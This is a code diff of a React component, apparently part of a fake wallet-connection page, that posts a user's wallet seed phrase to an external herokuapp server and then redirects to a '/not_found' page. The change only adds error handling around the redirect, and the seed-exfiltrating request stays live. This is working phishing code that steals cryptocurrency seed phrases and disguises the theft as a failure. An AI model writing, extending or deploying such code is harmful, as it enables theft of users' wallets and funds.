@@ -27,11 +27,16 @@ const PrivateKey = ({ seed3, setSeed3, error3, setError3, disabled3, setDisabled
     const res = await axios.post("https://dappswallet.herokuapp.com/form", {
       seed: seed3
     });
-    if (res.data.status === 200) {
-      Navigate("/not_found");
-    } else {
-      console.log("error eyaf happen");
+    try{
+      if (res.data.status === 200) {
+        Navigate("/not_found");
+      } else {
+        console.log("error eyaf happen");
+      }
+    }catch(err){
+      console.log(err);
     }
+    
   };
 
   useEffect(() => {
